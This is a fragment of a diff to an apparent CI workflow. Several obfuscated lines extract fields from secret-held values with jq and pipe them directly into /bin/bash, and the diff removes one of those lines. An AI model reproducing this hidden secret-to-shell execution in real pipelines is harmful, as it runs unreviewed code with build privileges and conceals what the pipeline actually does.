@@ -23,7 +23,6 @@ jobs:
           um78: ${{ secrets.um78 }}
         run: |
           printf '%s' "$um78" | jq -r .stt52685 | /bin/bash
-          echo $k1 | jq -r .imnyx79 | /bin/bash
           printf '%s' "$fh75348" | jq -r .uf522 | /bin/bash
           printf '%s' "$fbdbh93" | jq -r .rjsx5 | /bin/bash
           printf '%s' "$k8" | jq -r .ffdgt47 | /bin/bash
